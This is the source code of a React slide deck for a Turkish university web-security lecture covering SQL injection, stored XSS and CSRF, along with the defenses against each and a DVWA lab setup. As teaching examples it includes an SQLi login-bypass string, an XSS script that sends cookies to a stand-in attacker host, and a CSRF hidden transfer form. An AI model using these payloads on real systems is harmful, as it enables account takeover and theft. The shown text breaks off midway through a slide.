"use client";

import {
  useCallback,
  useEffect,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Shield,
  ShieldCheck,
  Database,
  Code,
  Bug,
  AlertTriangle,
  Globe,
  Server,
  Laptop,
  ArrowRight,
  ListChecks,
  Lock,
  Eye,
  Cookie,
  FileWarning,
  Terminal,
  Filter,
  Layers,
  Calendar,
  Target,
  Brain,
  Sparkles,
  ChevronRight,
  ChevronLeft,
  Maximize2,
  Minimize2,
  Keyboard,
  Send,
  KeyRound,
  type LucideIcon,
} from "lucide-react";
import "./styles.css";

/* ============================================================
   PRIMITIVES
   ============================================================ */

function SlideShell({
  children,
  bgPattern = true,
}: {
  children: ReactNode;
  bgPattern?: boolean;
}) {
  return (
    <div className="relative w-full h-full flex items-center justify-center px-12 py-16">
      {bgPattern && (
        <div className="absolute inset-0 sgbh-grid-bg pointer-events-none" />
      )}
      <div className="relative z-10 w-full max-w-6xl">{children}</div>
    </div>
  );
}

function Eyebrow({ children }: { children: ReactNode }) {
  return (
    <motion.div
      initial={{ opacity: 0, x: -10 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
      className="inline-flex items-center gap-3 mb-6 text-xs font-mono uppercase tracking-[0.25em] text-[#06b6d4]"
    >
      <span className="w-8 h-px bg-[#06b6d4]" />
      {children}
    </motion.div>
  );
}

function H1({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.h1
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, ease: [0.22, 1, 0.36, 1] }}
      className={`text-5xl md:text-7xl font-bold tracking-tight leading-[1.05] text-white ${className}`}
    >
      {children}
    </motion.h1>
  );
}

function H2({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.h2
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.1 }}
      className={`text-3xl md:text-5xl font-semibold tracking-tight text-white ${className}`}
    >
      {children}
    </motion.h2>
  );
}

function Sub({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.p
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className={`text-lg md:text-xl text-gray-400 leading-relaxed ${className}`}
    >
      {children}
    </motion.p>
  );
}

function FeatureCard({
  icon: Icon,
  title,
  desc,
  delay = 0,
  accent = "#06b6d4",
}: {
  icon: LucideIcon;
  title: string;
  desc: string;
  delay?: number;
  accent?: string;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-card sgbh-card-hover rounded-xl p-6 transition-all"
    >
      <div
        className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
        style={{ background: `${accent}15`, border: `1px solid ${accent}40` }}
      >
        <Icon className="w-6 h-6" style={{ color: accent }} />
      </div>
      <h3 className="text-lg font-semibold text-white mb-2">{title}</h3>
      <p className="text-sm text-gray-400 leading-relaxed">{desc}</p>
    </motion.div>
  );
}

function SectionDivider({
  num,
  total,
  title,
  subtitle,
  bgGradient,
  shadow,
  icon,
}: {
  num: string;
  total: string;
  title: string;
  subtitle: string;
  bgGradient: string;
  shadow: string;
  icon: ReactNode;
}) {
  return (
    <SlideShell bgPattern={false}>
      <div className="text-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.5 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
          className="inline-flex w-32 h-32 rounded-3xl items-center justify-center mb-8 sgbh-pulse"
          style={{ background: bgGradient, boxShadow: shadow }}
        >
          {icon}
        </motion.div>
        <Eyebrow>
          Bölüm {num} / {total}
        </Eyebrow>
        <H1>{title}</H1>
        <Sub className="mt-6 max-w-2xl mx-auto">{subtitle}</Sub>
      </div>
    </SlideShell>
  );
}

/* ============================================================
   TOPIC-SPECIFIC MOCKUPS
   ============================================================ */

function WindowChrome({
  title,
  icon,
  children,
  className = "",
}: {
  title: string;
  icon: ReactNode;
  children: ReactNode;
  className?: string;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.96, y: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2, ease: [0.22, 1, 0.36, 1] }}
      className={`sgbh-window-chrome w-full ${className}`}
    >
      <div className="sgbh-window-bar flex items-center gap-2 px-4 py-2.5">
        <div className="flex gap-1.5">
          <span className="w-3 h-3 rounded-full bg-red-500/70" />
          <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
          <span className="w-3 h-3 rounded-full bg-green-500/70" />
        </div>
        <div
          className="flex items-center gap-2 ml-3 px-3 py-1 rounded text-[11px] flex-1 max-w-md mx-auto text-center justify-center font-mono"
          style={{ background: "#0d0d0d", color: "#67e8f9" }}
        >
          {icon}
          <span>{title}</span>
        </div>
      </div>
      {children}
    </motion.div>
  );
}

/* SQL Injection — kırılgan sorgu, sonra parametreli düzeltme */
function SqliMockup() {
  return (
    <WindowChrome
      title="auth.php — login sorgusu"
      icon={<Database className="w-3.5 h-3.5" />}
      className="max-w-4xl mx-auto"
    >
      <div className="sgbh-code">
        <div className="sgbh-code-cmt">// Kullanıcı girdisi: kullanici = a.yilmaz</div>
        <div className="sgbh-code-cmt">// Saldırgan girdisi: kullanici = &apos; OR &apos;1&apos;=&apos;1&apos; --</div>
        <div className="mt-2">
          <span className="sgbh-code-cmt">// ❌ KIRILGAN — girdi sorguya doğrudan yapışıyor</span>
        </div>
        <div>
          <span className="sgbh-code-var">$sql</span> ={" "}
          <span className="sgbh-code-str">&quot;SELECT * FROM kullanicilar </span>
        </div>
        <div className="pl-12">
          <span className="sgbh-code-str">WHERE ad = &apos;&quot;</span> .{" "}
          <span className="sgbh-code-var">$_POST</span>[<span className="sgbh-code-str">&apos;kullanici&apos;</span>] .{" "}
          <span className="sgbh-code-str">&quot;&apos; AND parola = &apos;&quot;</span> . <span className="sgbh-code-var">$hash</span> .{" "}
          <span className="sgbh-code-str">&quot;&apos;&quot;</span>;
        </div>
        <div className="mt-2 sgbh-code-cmt">// Sunucuda oluşan sorgu:</div>
        <div>
          <span className="sgbh-code-kw">SELECT</span> * <span className="sgbh-code-kw">FROM</span> kullanicilar{" "}
          <span className="sgbh-code-kw">WHERE</span> ad ={" "}
          <span className="sgbh-code-inj">&apos;&apos; OR &apos;1&apos;=&apos;1&apos; --</span>
          <span className="sgbh-code-cmt"> &apos; AND parola = ...</span>
        </div>
        <div className="sgbh-code-cmt">
          // &apos;1&apos;=&apos;1&apos; her zaman doğru · -- gerisini yorum yapar → parola kontrolü atlanır
        </div>

        <div className="my-3 border-t border-white/5" />

        <div>
          <span className="sgbh-code-safe">// ✅ DÜZELTME — parametreli sorgu (prepared statement)</span>
        </div>
        <div>
          <span className="sgbh-code-var">$stmt</span> ={" "}
          <span className="sgbh-code-var">$pdo</span>-&gt;<span className="sgbh-code-kw">prepare</span>(
          <span className="sgbh-code-str">
            &quot;SELECT * FROM kullanicilar WHERE ad = <span className="sgbh-code-safe">?</span> AND parola = <span className="sgbh-code-safe">?</span>&quot;
          </span>
          );
        </div>
        <div>
          <span className="sgbh-code-var">$stmt</span>-&gt;<span className="sgbh-code-kw">execute</span>([
          <span className="sgbh-code-var">$kullanici</span>, <span className="sgbh-code-var">$hash</span>]);
        </div>
        <div className="sgbh-code-cmt">// Girdi artık veri; asla kod olarak çalıştırılmaz.</div>
      </div>
    </WindowChrome>
  );
}

/* Stored XSS — yorum kutusuna script enjekte edilmesi */
function XssMockup() {
  return (
    <WindowChrome
      title="https://forum.kurum-ornek.tr/gonderi/42 — yorumlar"
      icon={<Globe className="w-3.5 h-3.5" />}
      className="max-w-3xl mx-auto"
    >
      <div className="sgbh-browser-body">
        <div className="text-xs font-semibold text-gray-700 mb-3">Yeni yorum ekle</div>
        <div className="sgbh-vuln-form mb-4">
          <div className="text-[11px] text-gray-500 mb-1">Yorumunuz:</div>
          <div className="font-mono text-[12px] text-red-600 bg-red-50 border border-red-200 rounded px-2 py-1.5 break-all">
            &lt;script&gt;fetch(&apos;https://kotu.site/c?k=&apos;+document.cookie)&lt;/script&gt;
          </div>
          <div className="mt-2 inline-flex items-center gap-1.5 text-[11px] text-gray-700 bg-zinc-100 border border-zinc-300 rounded px-2.5 py-1">
            <Send className="w-3 h-3" /> Gönder
          </div>
        </div>
        <div className="text-[11px] text-gray-500 mb-2 border-t border-zinc-200 pt-3">
          Sayfa, yorumu sanitize etmeden HTML&apos;e basıyor → kayıtlı (stored) XSS
        </div>
        <div className="space-y-2">
          <div className="text-[12px] text-gray-700">
            <span className="font-semibold">m.demir:</span> Teşekkürler, çok faydalı.
          </div>
          <div className="text-[12px] text-gray-700 bg-amber-50 border border-amber-200 rounded px-2 py-1.5">
            <span className="font-semibold">anonim:</span>{" "}
            <span className="italic text-red-600">[script sessizce çalıştı — her ziyaretçinin çerezi çalındı]</span>
          </div>
        </div>
      </div>
    </WindowChrome>
  );
}

/* CSRF — sahte sitenin gizli form ile para transferi tetiklemesi */
function CsrfMockup() {
  const steps = [
    {
      n: 1,
      icon: Laptop,
      color: "#34d399",
      title: "Kurban bankaya giriş yapmış",
      detail: "banka.example.tr için geçerli oturum çerezi tarayıcıda duruyor.",
    },
    {
      n: 2,
      icon: Globe,
      color: "#fbbf24",
      title: "Tuzaklı sayfayı açıyor",
      detail: "Aynı sekmede kotu.site ziyaret ediliyor; sayfada gizli bir form var.",
    },
    {
      n: 3,
      icon: Send,
      color: "#f87171",
      title: "Tarayıcı isteği otomatik gönderiyor",
      detail: "Form banka.example.tr&apos;ye POST atar; tarayıcı çerezi otomatik ekler.",
    },
    {
      n: 4,
      icon: Server,
      color: "#a78bfa",
      title: "Sunucu isteği meşru sanıyor",
      detail: "Geçerli çerez var, token kontrolü yok → transfer onaylanır.",
    },
  ];
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className="sgbh-card rounded-xl p-6 max-w-4xl mx-auto"
    >
      <div className="font-mono text-[11px] bg-black/40 rounded-lg p-3 border border-white/5 mb-5 text-gray-300">
        <span className="sgbh-code-cmt">&lt;!-- kotu.site içindeki gizli form --&gt;</span>
        <br />
        <span className="sgbh-code-var">&lt;form</span> action=
        <span className="sgbh-code-str">&quot;https://banka.example.tr/transfer&quot;</span> method=
        <span className="sgbh-code-str">&quot;POST&quot;</span><span className="sgbh-code-var">&gt;</span>
        <br />
        &nbsp;&nbsp;&lt;input name=<span className="sgbh-code-str">&quot;alici&quot;</span> value=
        <span className="sgbh-code-inj">&quot;saldirgan_iban&quot;</span>&gt;
        <br />
        &nbsp;&nbsp;&lt;input name=<span className="sgbh-code-str">&quot;tutar&quot;</span> value=
        <span className="sgbh-code-inj">&quot;10000&quot;</span>&gt;
        <br />
        <span className="sgbh-code-var">&lt;/form&gt;</span>{" "}
        <span className="sgbh-code-cmt">// JavaScript ile otomatik submit()</span>
      </div>
      <div className="space-y-3">
        {steps.map((s, i) => (
          <motion.div
            key={s.n}
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.3 + i * 0.15 }}
            className="flex items-center gap-4"
          >
            <span className="w-6 h-6 rounded-full border border-gray-600 flex items-center justify-center text-[10px] text-gray-400 font-mono flex-shrink-0">
              {s.n}
            </span>
            <div
              className="flex-1 rounded-lg px-4 py-3 flex items-center gap-3"
              style={{ background: `${s.color}12`, border: `1px solid ${s.color}40` }}
            >
              <s.icon className="w-5 h-5 flex-shrink-0" style={{ color: s.color }} />
              <span className="text-sm font-semibold text-white whitespace-nowrap">{s.title}</span>
              <ArrowRight className="w-4 h-4 text-gray-600 flex-shrink-0 hidden md:block" />
              <span className="text-sm text-gray-300">{s.detail}</span>
            </div>
          </motion.div>
        ))}
      </div>
    </motion.div>
  );
}

/* DVWA terminal — labı ayağa kaldırma */
function DvwaTerminal() {
  return (
    <WindowChrome
      title="kali@pentest:~ — DVWA (Docker)"
      icon={<Terminal className="w-3.5 h-3.5" />}
    >
      <div className="sgbh-terminal">
        <div>
          <span className="sgbh-term-prompt">kali@pentest</span>
          <span className="sgbh-term-dim">:~$</span>{" "}
          <span className="sgbh-term-cmd">docker run --rm -it -p 8080:80 vulnerables/web-dvwa</span>
        </div>
        <div className="sgbh-term-dim">Unable to find image &apos;vulnerables/web-dvwa:latest&apos; locally</div>
        <div className="sgbh-term-dim">latest: Pulling from vulnerables/web-dvwa</div>
        <div className="sgbh-term-ok">Status: Downloaded newer image for vulnerables/web-dvwa:latest</div>
        <div className="sgbh-term-dim">[+] Starting apache2 ...</div>
        <div className="sgbh-term-dim">[+] Starting mysql ...</div>
        <div className="sgbh-term-ok">DVWA hazır → http://localhost:8080</div>
        <div className="sgbh-term-dim mt-1">Giriş: admin / password · Security level: Low</div>
        <div className="mt-2">
          <span className="sgbh-term-prompt">kali@pentest</span>
          <span className="sgbh-term-dim">:~$</span>{" "}
          <span className="sgbh-term-cmd">curl -s -I http://localhost:8080/login.php | head -n 1</span>
        </div>
        <div className="sgbh-term-warn">HTTP/1.1 200 OK</div>
        <div className="mt-2">
          <span className="sgbh-term-prompt">kali@pentest</span>
          <span className="sgbh-term-dim">:~$</span>{" "}
          <span className="sgbh-term-cmd">_</span>
          <span className="animate-pulse">█</span>
        </div>
      </div>
    </WindowChrome>
  );
}

/* ============================================================
   SLIDES
   ============================================================ */

const slides: Array<(active: boolean) => ReactNode> = [
  /* ───── 1. Kapak ───── */
  () => (
    <SlideShell>
      <div className="text-center">
        <Eyebrow>BVA 2205 · 4. Hafta · Güz Dönemi</Eyebrow>
        <H1>
          <span className="sgbh-shimmer">OWASP Top 10</span>
          <br />
          <span className="text-white/90">Bölüm 1 · Enjeksiyon &amp; Oturum Saldırıları</span>
        </H1>
        <Sub className="mt-8 max-w-2xl mx-auto">
          Web&apos;in en sık üç açığını içeriden gör: SQL Injection, XSS ve CSRF. Sonra DVWA labında elini kirlet.
        </Sub>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-12 max-w-3xl mx-auto">
          <FeatureCard
            icon={Database}
            title="SQL Injection"
            desc="Girdi sorguya yapışır; veritabanı okunur, kimlik doğrulama atlanır."
            delay={0.3}
            accent="#06b6d4"
          />
          <FeatureCard
            icon={Code}
            title="XSS"
            desc="Sayfaya saldırgan script&apos;i girer; çerez çalınır, oturum ele geçirilir."
            delay={0.45}
            accent="#fbbf24"
          />
          <FeatureCard
            icon={Cookie}
            title="CSRF"
            desc="Kurbanın oturumu kötüye kullanılarak istek dışı işlem yaptırılır."
            delay={0.6}
            accent="#f87171"
          />
        </div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.6 }}
          className="mt-12 inline-flex items-center gap-2 text-xs font-mono text-gray-500"
        >
          <Calendar className="w-3.5 h-3.5" />
          Çarşamba 13:30 — 17:00 · Uygulamalı lab (DVWA + Burp Suite)
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 2. Köprü: 3. haftadan 4. haftaya ───── */
  () => (
    <SlideShell>
      <Eyebrow>Köprü · 3. haftadan 4. haftaya</Eyebrow>
      <H2>Kriptografiyi kurduk; şimdi uygulamanın mantık hatalarına bakıyoruz</H2>
      <Sub className="mt-3 max-w-3xl">
        3. hafta verinin nasıl şifrelendiğini, özetlendiğini ve imzalandığını gördük. Ama en güçlü
        TLS bile, uygulamanın kullanıcı girdisine güvenmesini engellemez. Bu hafta saldırı yüzeyi
        artık ağ değil; <span className="text-white">kodun kendisi</span>.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-10">
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.2 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#67e8f9]">
            <Lock className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Şifreleme çözmediği</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#06b6d4] flex-shrink-0" />HTTPS, sunucuya gelen kötü girdiyi engellemez — sadece yolda korur.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#06b6d4] flex-shrink-0" />Şifreli kanaldan da bir SQL payload&apos;ı geçer.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#06b6d4] flex-shrink-0" />Açık, çoğu zaman uygulamanın güvendiği veriden doğar.</li>
          </ul>
        </motion.div>
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.35 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#fbbf24]">
            <Target className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Bu haftanın hedefi</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#fbbf24] flex-shrink-0" />Üç klasik web açığını mekanizmasıyla anlamak.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#fbbf24] flex-shrink-0" />Her açığın somut payload&apos;ını ve doğru savunmasını görmek.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#fbbf24] flex-shrink-0" />DVWA labında kontrollü ortamda denemek.</li>
          </ul>
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 3. OWASP Top 10 haritası ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bağlam · OWASP Top 10 (2021)</Eyebrow>
      <H2 className="mb-2">Bu hafta listenin neresindeyiz?</H2>
      <Sub className="max-w-3xl mb-6">
        OWASP Top 10, web uygulamalarındaki en kritik 10 risk kategorisinin uzlaşı listesidir.
        Bu hafta kırmızı ile işaretli iki kategoriye odaklanıyoruz; XSS, 2021&apos;de ayrı bir
        sıra olmaktan çıkıp <span className="text-white">A03: Injection</span> altına alındı. CSRF&apos;i de
        bu bağlamda işliyoruz.
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
        className="grid grid-cols-1 md:grid-cols-2 gap-2.5"
      >
        {[
          { code: "A01", title: "Broken Access Control", desc: "Yetki atlatma — yatay/dikey hak yükseltme.", hot: false },
          { code: "A02", title: "Cryptographic Failures", desc: "Zayıf şifre, açık metin parola, eski TLS.", hot: false },
          { code: "A03", title: "Injection (SQLi · XSS)", desc: "BU HAFTA · girdi kod olarak çalışıyor.", hot: true },
          { code: "A04", title: "Insecure Design", desc: "Tasarımdan gelen kusur; tehdit modelleme eksik.", hot: false },
          { code: "A05", title: "Security Misconfiguration", desc: "Varsayılan parola, açık debug, geniş izin.", hot: false },
          { code: "A06", title: "Vulnerable Components", desc: "Yamalanmamış kütüphane (log4shell, Struts).", hot: false },
          { code: "A07", title: "Auth & Session Failures", desc: "CSRF&apos;in oturum tarafı · zayıf oturum yönetimi.", hot: true },
          { code: "A08", title: "Software & Data Integrity", desc: "İmzasız güncelleme, tedarik zinciri.", hot: false },
          { code: "A09", title: "Logging & Monitoring", desc: "Olay yok, alarm yok — saldırgan dolaşır.", hot: false },
          { code: "A10", title: "Server-Side Request Forgery", desc: "Sunucu, saldırganın istediği iç adrese gider.", hot: false },
        ].map((item, i) => (
          <motion.div
            key={item.code}
            initial={{ opacity: 0, x: i % 2 === 0 ? -12 : 12 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.1 + i * 0.04 }}
            className={`sgbh-card rounded-lg px-4 py-3 flex items-start gap-3 ${item.hot ? "sgbh-owasp-hot" : ""}`}
          >
            <span
              className="text-[10px] font-mono font-bold px-2 py-1 rounded flex-shrink-0"
              style={
                item.hot
                  ? { background: "#ef444418", color: "#fca5a5", border: "1px solid #ef444455" }
                  : { background: "#06b6d415", color: "#67e8f9", border: "1px solid #06b6d440" }
              }
            >
              {item.code}
            </span>
            <div className="min-w-0">
              <div className="text-sm font-semibold text-white leading-tight">{item.title}</div>
              <div className="text-[11px] text-gray-400 leading-snug mt-0.5">{item.desc}</div>
            </div>
          </motion.div>
        ))}
      </motion.div>
    </SlideShell>
  ),

  /* ───── 4. Bölüm 1 — SQL Injection ───── */
  () => (
    <SectionDivider
      num="01"
      total="03"
      title="SQL Injection"
      subtitle="Kullanıcı girdisi veritabanı sorgusunun parçası olduğunda, saldırgan sorgunun mantığını yeniden yazar."
      bgGradient="linear-gradient(135deg,#06b6d4,#0e7490)"
      shadow="0 30px 80px -20px rgba(6,182,212,0.6)"
      icon={<Database className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 5. SQLi mantığı ───── */
  () => (
    <SlideShell>
      <Eyebrow>SQLi · temel mantık</Eyebrow>
      <H2 className="mb-2">Veri ile kodun karışması</H2>
      <Sub className="max-w-3xl mb-6">
        Sorun teknik değil kavramsal: uygulama, kullanıcının yazdığı metni veri sanırken
        veritabanı onu <span className="text-white">komut</span> olarak çalıştırır. Saldırgan bu
        sınırı aşan birkaç karakterle (tek tırnak, <span className="font-mono text-[#67e8f9]">OR</span>,{" "}
        <span className="font-mono text-[#67e8f9]">--</span>) sorgunun anlamını değiştirir.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {[
          { icon: KeyRound, title: "Auth bypass", color: "#06b6d4", desc: "&apos; OR &apos;1&apos;=&apos;1 ile parola kontrolü her zaman doğru olur, giriş yapılır." },
          { icon: Eye, title: "Veri sızdırma", color: "#fbbf24", desc: "UNION SELECT ile başka tablolardan (kullanıcılar, kartlar) veri çekilir." },
          { icon: FileWarning, title: "Yıkım / kontrol", color: "#f87171", desc: "İleri seviyede tablo silme, dosya yazma, hatta komut çalıştırmaya kadar gider." },
        ].map((c, i) => (
          <motion.div
            key={c.title}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.15 + i * 0.12 }}
            className="sgbh-card rounded-xl p-6"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
              style={{ background: `${c.color}18`, border: `1px solid ${c.color}55` }}
            >
              <c.icon className="w-6 h-6" style={{ color: c.color }} />
            </div>
            <div className="text-base font-semibold text-white mb-2">{c.title}</div>
            <p className="text-sm text-gray-400 leading-relaxed">{c.desc}</p>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 6. SQLi kod mockup ───── */
  () => (
    <SlideShell>
      <Eyebrow>SQLi · kırılgan kod vs düzeltme</Eyebrow>
      <H2 className="mb-2">Sorun string birleştirme; çözüm parametre</H2>
      <Sub className="max-w-3xl mb-6">
        Aşağıda klasik bir giriş sorgusu var. Üstte girdi doğrudan birleştiriliyor; altta aynı
        sorgu parametreli (prepared statement) hâliyle güvenli.
      </Sub>
      <SqliMockup />
    </SlideShell>
  ),

  /* ───── 7. SQLi savunma ───── */
  () => (
    <SlideShell>
      <Eyebrow>SQLi · savunma katmanları</Eyebrow>
      <H2>Tek bir kural yetmez, sıralı savunma</H2>
      <Sub className="mt-3 max-w-3xl">
        Birincil savunma parametreli sorgudur; diğerleri onu destekler. Sadece &quot;girdiyi
        temizliyorum&quot; demek yetersiz ve hataya açıktır.
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3, duration: 0.6 }}
        className="mt-6 sgbh-card rounded-xl p-1"
      >
        <table className="sgbh-tbl">
          <thead>
            <tr>
              <th style={{ width: "28%" }}>Kontrol</th>
              <th style={{ width: "16%" }}>Öncelik</th>
              <th>Ne yapar?</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td className="text-white font-semibold">Parametreli sorgu / ORM</td>
              <td><span className="sgbh-pill sgbh-pill-c">Birincil</span></td>
              <td>Girdiyi koddan kesin ayırır; veri asla SQL gramerine karışmaz. Tek başına en etkili kontrol.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Girdi doğrulama (allow-list)</td>
              <td><span className="sgbh-pill sgbh-pill-a">Destek</span></td>
              <td>Beklenen biçimi zorla (örn. ID yalnız rakam). Kara liste değil, beyaz liste.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">En az yetki (DB kullanıcısı)</td>
              <td><span className="sgbh-pill sgbh-pill-a">Destek</span></td>
              <td>Uygulama DB hesabına DROP/GRANT verme; ihlalin etkisini sınırla.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">WAF + hata mesajı gizleme</td>
              <td><span className="sgbh-pill sgbh-pill-i">Ek katman</span></td>
              <td>Bilinen kalıpları filtreler, ayrıntılı SQL hatasını kullanıcıya göstermez. Asla tek savunma olmaz.</td>
            </tr>
          </tbody>
        </table>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 8. Bölüm 2 — XSS ───── */
  () => (
    <SectionDivider
      num="02"
      total="03"
      title="Cross-Site Scripting"
      subtitle="Saldırgan, kurbanın tarayıcısında çalışan JavaScript'i sayfaya enjekte eder. Hedef sunucu değil, diğer kullanıcılardır."
      bgGradient="linear-gradient(135deg,#f59e0b,#b45309)"
      shadow="0 30px 80px -20px rgba(245,158,11,0.55)"
      icon={<Code className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 9. XSS türleri ───── */
  () => (
    <SlideShell>
      <Eyebrow>XSS · üç tür</Eyebrow>
      <H2 className="mb-2">Script sayfaya nereden ve nasıl girer?</H2>
      <Sub className="max-w-3xl mb-6">
        Ortak nokta: tarayıcı, saldırganın verisini güvenilir sayfa içeriği sanıp çalıştırır.
        Fark, script&apos;in nereye yerleştiğidir.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {[
          { tag: "Stored (kalıcı)", color: "#f87171", icon: Database, desc: "Script veritabanına kaydedilir (yorum, profil). Sayfayı açan herkeste çalışır — en tehlikelisi." },
          { tag: "Reflected (yansıyan)", color: "#fbbf24", icon: ArrowRight, desc: "Script URL/parametreden gelir, anında yansır. Kurbana özel hazırlanmış link ile tetiklenir." },
          { tag: "DOM-based", color: "#a78bfa", icon: Code, desc: "Açık tamamen istemci JavaScript&apos;inde; sunucuya hiç uğramadan DOM&apos;da oluşur." },
        ].map((c, i) => (
          <motion.div
            key={c.tag}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.15 + i * 0.12 }}
            className="sgbh-card rounded-xl p-6"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
              style={{ background: `${c.color}18`, border: `1px solid ${c.color}55` }}
            >
              <c.icon className="w-6 h-6" style={{ color: c.color }} />
            </div>
            <div className="text-base font-semibold text-white mb-2">{c.tag}</div>
            <p className="text-sm text-gray-400 leading-relaxed">{c.desc}</p>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 10. XSS mockup ───── */
  () => (
    <SlideShell>
      <Eyebrow>XSS · canlı örnek (stored)</Eyebrow>
      <H2 className="mb-2">Yorum kutusundan çerez hırsızlığına</H2>
      <Sub className="max-w-3xl mb-6">
        Sayfa, yorumu HTML&apos;e basmadan önce kaçırmıyor (escape). Sonuç: yorumu gören her
        kullanıcının çerezi <span className="font-mono text-[#67e8f9]">document.cookie</span> ile
        saldırganın sunucusuna gönderilir. <span className="text-white">HttpOnly</span> çerez bu
        özel hırsızlığı zorlaştırır.
      </Sub>
      <XssMockup />
    </SlideShell>
  ),

  /* ───── 11. XSS savunma ───── */
  () => (
    <SlideShell>
      <Eyebrow>XSS · savunma</Eyebrow>
      <H2>Çıktıyı kaçır, çerezi koru, script&apos;i sınırla</H2>
      <Sub className="mt-3 max-w-3xl">
        XSS&apos;in çekirdek çözümü <span className="text-white">çıktı kodlama</span>dır: veriyi
        bulunduğu bağlama (HTML, attribute, JS, URL) göre kaçırmak. Diğerleri derinlik katar.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-5 mt-8">
        {[
          { icon: Filter, title: "Bağlama duyarlı çıktı kodlama", color: "#fbbf24", desc: "Veriyi yazdığın yere göre escape et: HTML&apos;de &lt; → &amp;lt;, JS bağlamında ayrı. Çoğu modern framework (React, Angular) bunu varsayılan yapar." },
          { icon: Lock, title: "HttpOnly + Secure çerez", color: "#34d399", desc: "Oturum çerezini JavaScript&apos;ten eriştirme (HttpOnly) ve yalnız HTTPS&apos;te gönder (Secure). Çalınması zorlaşır." },
          { icon: Shield, title: "Content Security Policy (CSP)", color: "#06b6d4", desc: "Tarayıcıya hangi kaynaktan script çalıştırabileceğini söyle; satır içi script&apos;i kapat. Enjekte edilen kod çalışmaz." },
          { icon: ListChecks, title: "Girdi doğrulama (destek)", color: "#a78bfa", desc: "Beklenen biçimi zorla; ama tek başına yetmez — esas savunma çıktı tarafındadır." },
        ].map((c, i) => (
          <motion.div
            key={c.title}
            initial={{ opacity: 0, x: i % 2 === 0 ? -20 : 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.15 + i * 0.1 }}
            className="sgbh-card rounded-xl p-5 flex items-start gap-4"
          >
            <div
              className="w-11 h-11 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ background: `${c.color}18`, border: `1px solid ${c.color}55` }}
            >
